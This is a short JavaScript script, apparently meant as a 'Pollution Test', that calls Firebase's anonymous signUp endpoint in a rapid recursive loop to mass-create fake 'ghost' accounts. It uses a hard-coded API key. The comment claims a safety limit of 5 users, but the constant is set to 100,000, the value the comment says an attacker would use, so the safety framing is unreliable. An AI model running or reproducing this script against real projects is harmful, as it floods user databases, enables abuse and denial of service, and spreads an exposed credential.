const API_KEY = "AIzaSyD4hy_OzuI_VZRJ3CGETpW8_u3wNq816EM";
const signUpUrl = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}`;

// 🛑 SAFETY LIMIT: Only create 5 fake users. 
// A hacker would set this to 100,000.
const MAX_FAKE_USERS = 100000; 

console.log(`👻 Starting Pollution Test (Limit: ${MAX_FAKE_USERS} users)...`);

let count = 0;

function createGhostUser() {
  if (count >= MAX_FAKE_USERS) {
    console.log("✅ Test Finished. Pollution limited for safety.");
    return;
  }

  fetch(signUpUrl, {
    method: 'POST',
    body: JSON.stringify({ returnSecureToken: true }),
    headers: { 'Content-Type': 'application/json' }
  })
  .then(res => res.json())
  .then(data => {
    count++;
    console.log(`[${count}/${MAX_FAKE_USERS}] Created Ghost User: ${data.localId}`);
    
    // Recursive call with a small delay to prevent browser freezing
    setTimeout(createGhostUser, 20); 
  })
  .catch(err => console.error("Error:", err));
}

// Start the loop
createGhostUser();